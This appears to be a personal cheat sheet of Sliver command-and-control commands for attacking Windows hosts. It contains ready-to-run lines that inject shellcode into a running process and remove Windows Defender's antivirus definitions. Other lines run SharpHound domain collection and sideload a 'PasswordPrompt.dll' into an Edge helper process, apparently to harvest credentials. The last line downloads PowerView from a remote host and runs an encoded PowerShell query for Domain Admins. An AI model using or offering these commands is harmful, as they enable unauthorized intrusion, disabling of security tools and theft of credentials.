
```
run shellcode in sliver
execute-shellcode -p 2760 /tmp/payload.bin

removes the av signatures
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

run sharphound
sharp-hound-4 -- '-c all,GPOLocalGroup'

sideload (sliver is using donut)
https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
sideload --entry-point RunMyCode --process "C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\identity_helper.exe" /mnt/smb/PasswordPrompt.dll 3

sharpsh
sharpsh -- '-u http://192.168.56.1:9090/PowerView.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
```
